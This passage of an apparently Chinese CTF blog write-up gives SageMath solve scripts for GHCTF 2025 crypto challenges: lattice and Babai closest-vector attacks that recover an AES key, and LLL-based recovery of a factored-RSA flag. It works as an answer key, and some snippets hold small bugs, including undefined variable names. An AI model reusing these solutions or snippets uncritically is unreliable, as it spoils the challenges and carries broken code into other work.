<span class="number">9241433814815706758885649801540944918822400007457713603674159882791199750057709773097552334465041959969676782253637817171507122904345522225398825682237481</span>, <span class="number">11204803848333722110323297716136514262820561394355433234423667799557561253910421337700868735544193790444406938869863716247161888020220901893711513603634809</span>, <span class="number">10851090251796215969502640347727949807230163009657915435491546953253351810608099195268759626721620529756828379004467476267712531905975334082089231769707617</span>, <span class="number">11250957460128461102060212243723539805901629603092001540925013383541943835129096257407578679799378517176957440298695788786794500447140718667332595080944869</span>, <span class="number">12248623923069220370917375593286718711586079377902376988707257328512455851210970182518826733646869485671374318338949112466814956514662420760908691130244383</span>, <span class="number">11061068271412202445428992286301637014530049371871820612053163253748795430394720967354122057185625710764847486790478210908967065668096047462000900877243843</span>, <span class="number">9250800791153158078642768324800520716511537203538708124830844957330029236789799844775267058446261708862442981956837389747149720449997356553753692631237873</span>, <span class="number">11442112467994330302413453979716258058149104607244851803491048585747359474970005873336772224480265499136742622823880716879860377641238675210553131052206691</span>, <span class="number">8851268226889934481971979527547782930762103134830344221114784617526682434893736517219781937490279514229768881864475696389373739501629994242420024622585309</span>, <span class="number">8761826274329402585517262093482651333161640060627583337505498299736119877176278155436111156185319629046980645810012652601825582701466570339570478108791887</span>, <span class="number">8173260008522260126563915135008278248111293487661172115633899079869720932758788675224579864948752039769531398938248083971071345978173279466336354696742377</span>, <span class="number">11733325877716881936637372036969125985631514189799569847189115606745019694984456424617859168884541552882900918661071180298079869943357668081866511603361429</span>, <span class="number">12798678249651545625305346509566263707129030745621625744465668772298872710674031103310015594375483838020916596533864897632924958154707810583510669376046159</span>, <span class="number">11972367565183102195894957634073708898746516169055154830786380821612631063771935949099855541345280195465211676841845799521135332692746439801114025346776451</span>, <span class="number">8309485355838062558333744941897142201736283502970173073711189070760311131678107029730686549988329677109870570827466668034034377094834508445549924223585219</span>, <span class="number">10037957030668927878463105058548635761147918169468443696251870837018029994579358415317101911755591591785037623566701920710453008930531891302329922308475079</span>, <span class="number">13221078857886779075714191159549244640144219704164657103905516889650093241197471185563906205007376146027157620524696025494715411571586859030421582641250071</span>, <span class="number">13377141034964464295846379646837504968557246139611266461228568513844912255762222441387410898249170108735540582627742796017922462329606088337301365183628591</span>, <span class="number">11503417590216916228951909788782481610038959664264972733435373475346403291387209063270057139621628854733942831548624992555175497319058962145185736395531609</span>, <span class="number">10682562966818807073688884352394574841623385668134186058213080078637580526582062737913378756835873195913042020318042792997704842570481165538229628253983417</span>, <span class="number">7009494733984067792833862756223517770477471938386639921019003601598472840183655333614008677846799784155444425042016748876974547683111073376705004070094301</span>, <span class="number">9396274922380984183217450286560296708001013262936289587249206096013034374236192395477584831821730898646879768741299571262843654547918064041618890696711333</span>, <span class="number">9055143657462834722016836241561857041386247088507191351272758917384350750091500866289528933248085632291073921554368989805281660196853938630560350667255913</span>, <span class="number">7075881589550115729079726581415060529537262743216265811601339312252250745864621882784185460812341989475906020671174894015501378625757286896275136526488817</span>]</span><br><span class="line">gs = [<span class="number">3547025130757031371763547817278671805806523773597386380426228204353325314755125874825372064344551510783942287325061869515563511720377069479838665918916338</span>, <span class="number">561524185998066303459395863084068415723518371857539287162474295289737845979144864495515229777991463363132381517905379393086271602757286846999926034367409</span>, <span class="number">10630918988200018501478600883655233518093875635494077893436132190015060760951001030031068630865667129447250982542911493607849695255758299063471724885107320</span>, <span class="number">5385738167688714294394456876987750423263279740302210790063861475593679005286633965917637168163655774852001750955925563171806165861440634515967640179944804</span>, <span class="number">3686451063569312252337028014973428925521749963152262622523483348285262144703447272544972123815729823760936936761643322992469583780002855185407873398768127</span>, <span class="number">9596580956215126253893458055745193704575088913515678341231900675542245449333964660007025564677263334281046226112471415925784249910282102204627251580303047</span>, <span class="number">9656829597739031272294632966205884640125918053307645634673206826103547310810254891833432384622548154588598670746803614688469837172848481449498079690935715</span>, <span class="number">9907308304392368929600091658386459655450451232070442677496713774343506026327224070703486188335961098033888098971263207077722473044862118000082007110037557</span>, <span class="number">7839372385123283975949639433665292734490760458360682832497005213559939527031767909811695257768341209806346811519315554587887588294359891829457980910373676</span>, <span class="number">9524560447616291402016995361580593070951296833074538783490159546001656765257005901587161833656370873513309819850104060230660386406669378214335512722509152</span>, <span class="number">8734422874517209772760818316188000967216535009508164549745674472106165337990045713973843427581730460676070294620298664038968581128044873585552989614725336</span>, <span class="number">5148158222052082942951739997892280954937954769195857112271289335776175568625514426629773392655353554820374445881301175856523121361252868192790918069469104</span>, <span class="number">3405639365216597742633558534342314393231966921971024333387009357007031255109911181571542920889177048552084631482291912851876735480121959418518626599223928</span>, <span class="number">6965895908963098896413697893751255263053889382630643791713636829201586125658579731479485123904224727756791164618191156426250811133029277086293720268527300</span>, <span class="number">515472047175628755463279789359658211455570096067652817360508027869002916852457796014115363850477155232728049656195126940493402028508630979737222916876246</span>, <span class="number">8377848726362282033165443045774756072489017398005262818165334796393061408947900148462399707261050565348807577258621241416711089587307194346694505937252864</span>, <span class="number">1178755053483981880338850194698011124968424379914871101461970724324613752209283539401502897388962321646518511682063263530792638817282211333222820982688221</span>, <span class="number">6409725586399153562174435158247599193499008381130383743433623949976530392240171542527657077771723107664747118903213393154893390715457247849808357209465942</span>, <span class="number">3372824803484968486680937546271819996332625362891283809637871759604598252172343794474197823370030403360262989580844260103083478034905726890611202238641340</span>, <span class="number">13221067729455004299677399984872603663881675510140157358091630484387026309376774076498558628883879446483977202290444900329681753187886973457338777404374837</span>, <span class="number">7168388056726802823482632673894477305062116631923141017136239676696007696629606782541016490173953868270727600022309320772114799519383514048456314407549126</span>, <span class="number">5250230933448962245502125593869313477032913928941516938273943408457441209365441112912617832856547549404891414953525445963675011329667621804152746371657313</span>, <span class="number">8511291855606246692070730459514263912089592580342504124890734122750181111943376656479213361961009582891618556261302703133404839204999651359329176948170842</span>, <span class="number">10576966024912004586600985705328475294820172279541596349092328002861342696932964481093301707680584309062968518297314914578723605267596141569538103299931592</span>, <span class="number">12610576251820483830699440118009518195547953924641848179631259695652398482759919292823264035055444639679877606276670927735340951916197191958922906156370663</span>, <span class="number">3742260845065949575192054445757226288737527960324254459850715703182879384214273141678432129201712761002566924178045796602250837169613100836509080462118064</span>, <span class="number">11563799338655584285772430060426469486983276581413105960901201146319641194721216394735314795999096052047566733050321685673448559752053334666493545565267458</span>, <span class="number">2135904971793751083168704063674429207856744601756475004904460101727999030934815461118290836502605293753384609825541213034656253854812143724421464450937515</span>, <span class="number">3115138049292154301818359336614981367419382594686950083225042221335435796679806070685800479754927915293066789893346628151325862299622031407323031470432866</span>, <span class="number">11834987428374239733081967249175125232293539826462896997963240557834259212701171232384194311849363016441847536816726226234955703291712817155658535826680986</span>]</span><br><span class="line">iv = <span class="string">b&#x27;\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8&#x27;</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&amp;8%,M&#x27;</span></span><br><span class="line">rs = ts</span><br><span class="line">cs = gs</span><br><span class="line"></span><br><span class="line">G=GF(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">  small = target</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">      c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">      small -= M[i] * c</span><br><span class="line">  <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">A = matrix(ZZ, m+n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = p</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[m , x] = rs[x]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, cs)</span><br><span class="line">res = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line">R = IntegerModRing(p)</span><br><span class="line">M = Matrix(R, rs)</span><br><span class="line">res=vector(R, res)</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(cs,res):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i-j))-<span class="number">2</span>==<span class="number">400</span></span><br><span class="line">key=((res[<span class="number">0</span>])*inverse(rs[<span class="number">0</span>],p)) %p</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">flag = cipher.decrypt(ciphertex)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>奇怪的是，我<code>HNP</code>构造的格出不来，我感觉已经是配平了的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">M = Matrix(ZZ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^(<span class="number">512</span>-<span class="number">400</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p * k</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i] * k</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i] * k</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">2</span>^<span class="number">512</span></span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == <span class="number">2</span>^<span class="number">512</span>:</span><br><span class="line">        <span class="built_in">print</span>(i[-<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>然后，翻了一下别的师傅的<code>wp</code>(在下面)，发现，这里规约出来的都是<strong>p-key</strong>？？？人傻了，这是什么原理？看了一下出题人自己的<a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">wp</a>，好像并没有这个问题<br><img src="https://pic1.zhimg.com/80/v2-e74d7d58b38938f539b9cf92783a11cf_1440w.png" alt=""><br>会这样的吗，不理解，那就下次记住吧(???)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">L = Matrix(QQ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^<span class="number">400</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i]</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i]</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = k/p</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = k</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == k:</span><br><span class="line">        key = p-(<span class="built_in">abs</span>(i[-<span class="number">2</span>].numerator())/k)</span><br></pre></td></tr></table></figure><h2 id="EZ-Fermat-bag-Pro"><a href="#EZ-Fermat-bag-Pro" class="headerlink" title="EZ_Fermat_bag_Pro"></a>EZ_Fermat_bag_Pro</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">88</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">f = P(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p,q),n)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">str</span>(p)))) <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>:])</span><br><span class="line">c = bytes_to_long(flag) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line"><span class="string">f = x^31 - x^30*y - 2*x^29*y^2 + 7*x^28*y^3 + 2*x^27*y^4 - 4*x^24*y^7 + 3*x^23*y^8 - x^20*y^11 - 4*x^19*y^12 + x^18*y^13 - 5*x^17*y^14 - 4*x^16*y^15 - x^15*y^16 + x^14*y^17 + x^13*y^18 + x^12*y^19 - 2*x^11*y^20 - 3*x^9*y^22 + 5*x^7*y^24 + x^6*y^25 + 6*x^4*y^27 + x^3*y^28 + 2*x*y^30 + y^31 - 2*x^30 - 3*x^29*y + 2*x^28*y^2 + 2*x^27*y^3 - x^26*y^4 - x^25*y^5 - 2*x^24*y^6 - 3*x^23*y^7 - 3*x^22*y^8 - 3*x^20*y^10 - 4*x^19*y^11 + 2*x^18*y^12 + x^15*y^15 - x^14*y^16 - 2*x^12*y^18 - 3*x^11*y^19 - x^10*y^20 + x^9*y^21 + 2*x^8*y^22 + x^7*y^23 + x^5*y^25 - x^4*y^26 - 2*x^3*y^27 - 2*x^2*y^28 - y^30 - 2*x^29 - x^28*y + 3*x^26*y^3 - x^25*y^4 - 2*x^24*y^5 + x^23*y^6 - x^22*y^7 - x^20*y^9 + 2*x^19*y^10 + 2*x^18*y^11 + x^16*y^13 + x^15*y^14 + x^14*y^15 + x^13*y^16 + x^12*y^17 + 5*x^11*y^18 - x^9*y^20 - 2*x^8*y^21 - 5*x^7*y^22 - 2*x^6*y^23 + 3*x^5*y^24 - 5*x^3*y^26 - x^2*y^27 + 2*x*y^28 - y^29 + 3*x^28 + 3*x^27*y - 2*x^26*y^2 + x^25*y^3 + 2*x^24*y^4 - x^23*y^5 - 2*x^22*y^6 - 3*x^20*y^8 - 3*x^19*y^9 + 4*x^17*y^11 - x^16*y^12 - 3*x^15*y^13 - 2*x^14*y^14 + x^13*y^15 + 2*x^12*y^16 - 2*x^11*y^17 + x^10*y^18 - 2*x^9*y^19 + x^8*y^20 - 2*x^7*y^21 - x^6*y^22 + x^5*y^23 - x^4*y^24 + x^3*y^25 + x^2*y^26 - x*y^27 - y^28 + x^27 + x^26*y - 2*x^24*y^3 + x^23*y^4 - 3*x^22*y^5 - 2*x^21*y^6 - 2*x^20*y^7 - 5*x^19*y^8 + 2*x^18*y^9 - 5*x^17*y^10 + x^16*y^11 - 3*x^15*y^12 - 4*x^14*y^13 - x^13*y^14 + x^12*y^15 + 3*x^11*y^16 + 2*x^10*y^17 - 4*x^9*y^18 - 2*x^6*y^21 + x^5*y^22 + 4*x^3*y^24 + 2*x^2*y^25 + 2*x*y^26 - 2*y^27 + x^25*y + x^24*y^2 + x^23*y^3 + 5*x^22*y^4 + x^20*y^6 - 3*x^19*y^7 + x^18*y^8 - x^17*y^9 + 2*x^15*y^11 - x^14*y^12 + 2*x^13*y^13 - x^12*y^14 + 4*x^11*y^15 - x^10*y^16 - 2*x^6*y^20 - x^5*y^21 + 3*x^3*y^23 + x^2*y^24 - 3*x*y^25 - 3*y^26 + 3*x^25 - 2*x^23*y^2 - x^21*y^4 + x^17*y^8 + 2*x^16*y^9 - x^15*y^10 - 2*x^14*y^11 - x^13*y^12 + 2*x^12*y^13 - 2*x^11*y^14 - x^9*y^16 - x^8*y^17 - x^6*y^19 - x^5*y^20 + x^4*y^21 + x^3*y^22 + 5*x*y^24 - 2*y^25 - x^24 + 2*x^23*y + x^22*y^2 - x^21*y^3 - x^19*y^5 + x^18*y^6 - x^17*y^7 + 2*x^16*y^8 - 4*x^15*y^9 - x^14*y^10 - x^13*y^11 - x^12*y^12 + 4*x^10*y^14 + 2*x^9*y^15 - x^8*y^16 - 2*x^7*y^17 - 2*x^6*y^18 + 4*x^5*y^19 + x^4*y^20 + 2*x^2*y^22 - 5*x*y^23 - y^24 + x^23 - x^22*y + 2*x^21*y^2 - x^20*y^3 - x^18*y^5 - x^17*y^6 - 5*x^15*y^8 + x^14*y^9 - 3*x^13*y^10 + 3*x^12*y^11 + 2*x^11*y^12 - 2*x^10*y^13 - 2*x^9*y^14 - x^8*y^15 + 2*x^7*y^16 - 2*x^6*y^17 - 4*x^5*y^18 - 5*x^3*y^20 - x^2*y^21 - x*y^22 - 4*y^23 - x^22 + 2*x^21*y - 2*x^20*y^2 - 2*x^19*y^3 - 3*x^17*y^5 - x^16*y^6 - x^15*y^7 + 4*x^13*y^9 + 2*x^12*y^10 + 3*x^11*y^11 + 2*x^10*y^12 - x^9*y^13 - x^7*y^15 + 2*x^6*y^16 + x^3*y^19 + 2*x^2*y^20 + 2*x*y^21 + 3*y^22 - 3*x^21 - x^20*y - x^19*y^2 + 2*x^17*y^4 - x^16*y^5 - x^15*y^6 + x^14*y^7 - 5*x^12*y^9 - 2*x^11*y^10 + x^10*y^11 + x^6*y^15 + x^5*y^16 + x^4*y^17 - 3*x^2*y^19 - 2*x*y^20 - 2*y^21 + x^20 + 2*x^19*y - 2*x^17*y^3 + 2*x^16*y^4 - 3*x^15*y^5 + 4*x^14*y^6 + 2*x^13*y^7 - x^12*y^8 - 2*x^11*y^9 + x^10*y^10 + 6*x^9*y^11 + x^8*y^12 + x^7*y^13 + 2*x^5*y^15 + 4*x^4*y^16 + x^3*y^17 - x^2*y^18 + 3*x*y^19 - x^17*y^2 + 2*x^16*y^3 + 3*x^14*y^5 - x^13*y^6 + 2*x^11*y^8 + x^10*y^9 + 3*x^9*y^10 - x^7*y^12 - x^6*y^13 + 3*x^5*y^14 - 4*x^4*y^15 + x^2*y^17 + 2*y^19 - x^18 - x^16*y^2 - 2*x^14*y^4 - 2*x^13*y^5 - 2*x^12*y^6 + 2*x^11*y^7 + 3*x^9*y^9 + 3*x^8*y^10 + x^6*y^12 - x^4*y^14 + 2*x^3*y^15 + 2*x^2*y^16 - 2*x*y^17 - x^17 - 4*x^16*y - 2*x^15*y^2 + 2*x^14*y^3 - x^13*y^4 + x^12*y^5 - 2*x^11*y^6 - 3*x^10*y^7 - x^9*y^8 - 5*x^8*y^9 + 2*x^7*y^10 + 2*x^6*y^11 - x^5*y^12 + x^4*y^13 - 3*x^2*y^15 + x*y^16 - 3*x^16 + x^15*y - 3*x^14*y^2 - x^13*y^3 - x^12*y^4 + 2*x^11*y^5 - x^10*y^6 + 5*x^8*y^8 + 3*x^7*y^9 + 3*x^6*y^10 + 2*x^5*y^11 + 4*x^4*y^12 + 2*x^3*y^13 + x^2*y^14 - 3*x*y^15 - x^15 + 3*x^14*y + x^13*y^2 - x^12*y^3 - 3*x^11*y^4 + x^10*y^5 - x^9*y^6 + 2*x^8*y^7 - x^7*y^8 + 4*x^5*y^10 - 2*x^4*y^11 + x^3*y^12 - x^14 + x^13*y + 2*x^12*y^2 + x^11*y^3 - 5*x^10*y^4 - x^9*y^5 - 3*x^8*y^6 - 2*x^7*y^7 + x^6*y^8 + 3*x^5*y^9 + x^4*y^10 + 2*x^3*y^11 - x^2*y^12 - 4*x*y^13 + 3*y^14 + x^12*y - 2*x^11*y^2 - x^9*y^4 - x^8*y^5 + 5*x^7*y^6 - 4*x^6*y^7 + 3*x^5*y^8 + 4*x^4*y^9 - 3*x^3*y^10 - x^2*y^11 - 2*x*y^12 - 3*y^13 + 3*x^12 + x^11*y + x^10*y^2 + x^9*y^3 + x^8*y^4 - x^6*y^6 - x^5*y^7 - 4*x^3*y^9 - x^2*y^10 - 3*x*y^11 - 2*y^12 + x^10*y + 5*x^9*y^2 + x^8*y^3 + 3*x^5*y^6 + x^4*y^7 + 2*x^3*y^8 - 4*x^2*y^9 + 2*x*y^10 + 3*y^11 - x^10 - 2*x^9*y - 2*x^7*y^3 - x^6*y^4 + x^5*y^5 + 3*x^4*y^6 - 2*x^2*y^8 - x*y^9 + 4*x^9 - 3*x^8*y - 3*x^6*y^3 + x^5*y^4 - x^4*y^5 - 2*x^3*y^6 - 2*x^2*y^7 + x*y^8 + 4*y^9 + 2*x^8 - x^7*y - 2*x^5*y^3 - 4*x^4*y^4 + 3*x^3*y^5 + 4*x^2*y^6 + 2*x*y^7 - 2*y^8 + 2*x^7 + 3*x^5*y^2 + 3*x^2*y^5 - x*y^6 - 4*x^6 + 6*x^3*y^3 + 2*x^2*y^4 - 2*x*y^5 - 3*y^6 + x^5 - 3*x^4*y + x^3*y^2 + x^2*y^3 - 2*x*y^4 + 2*x^4 - 2*x^3*y + 6*x^2*y^2 - 3*x*y^3 - 2*y^4 - 5*x^3 - 2*x^2*y - 2*x*y^2 + 3*y^3 + 2*x^2 - x*y + y^2 - 2*x + 2*y - 2</span></span><br><span class="line"><span class="string">w = 12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line"><span class="string">c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>emmm，怎么说呢，去<strong>github</strong>搜了一下<strong>pow(2,f(p,q),n)</strong>，真给我找到了(注意看，五天前)<br><img src="https://picx.zhimg.com/80/v2-42436e9a39d3de9fa72f9af9ef543381_1440w.png" alt=""><br>看过程，就<strong>GCD求出p</strong>是一样的，求<code>flag</code>还得自己想办法<br>之后就是顺藤摸瓜环节了，所以这题可以参考<code>ictf</code>月赛(应该是月赛吧)的<code>wp</code>，具体原理还没研究</p><p>(突然间有一个想法，让小凳刷刷这里月赛的题，虽然<code>wp</code>给的是<code>exp</code>，应该能学到点东西的吧？好像国内就没有这种形式的比赛，不像<code>cf</code>那样)</p><p><a href="https://imaginaryctf.org/ArchivedChallenges">https://imaginaryctf.org/ArchivedChallenges</a><br><strong>Archived Challenges - February 2025 - Crypto - bivariate (110pts) - 10/02</strong></p><p>有意思的是，这题的前一题也是弱化版，跟上面的<strong>EZ_Fermat</strong>一样</p><p>小改一下参数，求出<code>p</code>之后卡了好久，80位的数字也太长了，并没有可行的思路，网上直接找，也找不到有用的参考</p><p>然后到了晚上就想起了<strong>羊城杯2024</strong>的一道题目<strong>rsa-loss</strong>，只能说比较类似，改了一下发现还是跑不出结果，因为脚本其实还是<strong>bcactf-4.0原题rsa_is_broken</strong>的脚本</p><p>半个多小时后，我又有想法了，会不会还有别的解题思路，一搜<strong>羊城杯2024rsa-loss</strong>，跳出一篇<code>csdn</code>的博客，<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/141638136">https://blog.csdn.net/XiongSiqi_blog/article/details/141638136</a></p><p>发现这位师傅套用的还是糖醋小鸡块师傅的脚本，再次<a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html">跳转</a><br><img src="https://picx.zhimg.com/80/v2-8b39516006a4e7434a581a17a06427fd_1440w.png" alt=""></p><p>专研一下师傅的思路，发现还是构造格，我之前也有构造格的想法(主要原因是我们已知<strong>flag的长度</strong>，而且可以从<strong>字节串转换为整型</strong>入手，$\ sum(a_{i}<em>255^{i})罢了$)，然后发现目标向量的数量级差距有点大，直接根据题目构造出来的格的话出来的目标向量是<em>*ASCII为48到57</em></em>，跟后面的1，0组成</p><p>所以得优化一下，弄成$t_{i}=a_{i}-48$，结果$t_{i}$就都是0-9这样的短向量了，规约出来的机会大得多，同时呢，我们的<code>c</code>也要进行处理</p><p>因为我们的$a_{i}\in [0,9]$，平均值会在4/5这样，需要给倒数第二列配4/5，<strong>使目标向量中值的数量级更加接近</strong></p><p>然后，我就用<strong>LLL算法</strong>进行<strong>格规约</strong>了，可以看到<strong>小鸡块师傅</strong>用的是<strong>BKZ算法</strong>(<strong>规约能力更强</strong>)，并且给格的<strong>最后一列</strong>配上了个<strong>大系数</strong>(至于多大，一般得自行测试调整)使得能规约出目标向量中的0，我一开始没用到，结果就是一位之差，最后还是加上了<br><img src="https://picx.zhimg.com/80/v2-f2f550ed8174549011cf7074e302cbc0_1440w.png" alt=""><br>可见，<strong>优化处理</strong>还是非常必要的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">n = <span class="number">95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line">f = x^<span class="number">31</span> - x^<span class="number">30</span>*y - <span class="number">2</span>*x^<span class="number">29</span>*y^<span class="number">2</span> + <span class="number">7</span>*x^<span class="number">28</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">4</span> - <span class="number">4</span>*x^<span class="number">24</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">8</span> - x^<span class="number">20</span>*y^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">12</span> + x^<span class="number">18</span>*y^<span class="number">13</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">16</span>*y^<span class="number">15</span> - x^<span class="number">15</span>*y^<span class="number">16</span> + x^<span class="number">14</span>*y^<span class="number">17</span> + x^<span class="number">13</span>*y^<span class="number">18</span> + x^<span class="number">12</span>*y^<span class="number">19</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">20</span> - <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">22</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">24</span> + x^<span class="number">6</span>*y^<span class="number">25</span> + <span class="number">6</span>*x^<span class="number">4</span>*y^<span class="number">27</span> + x^<span class="number">3</span>*y^<span class="number">28</span> + <span class="number">2</span>*x*y^<span class="number">30</span> + y^<span class="number">31</span> - <span class="number">2</span>*x^<span class="number">30</span> - <span class="number">3</span>*x^<span class="number">29</span>*y + <span class="number">2</span>*x^<span class="number">28</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">3</span> - x^<span class="number">26</span>*y^<span class="number">4</span> - x^<span class="number">25</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">7</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">10</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">12</span> + x^<span class="number">15</span>*y^<span class="number">15</span> - x^<span class="number">14</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">18</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">19</span> - x^<span class="number">10</span>*y^<span class="number">20</span> + x^<span class="number">9</span>*y^<span class="number">21</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">22</span> + x^<span class="number">7</span>*y^<span class="number">23</span> + x^<span class="number">5</span>*y^<span class="number">25</span> - x^<span class="number">4</span>*y^<span class="number">26</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">27</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span 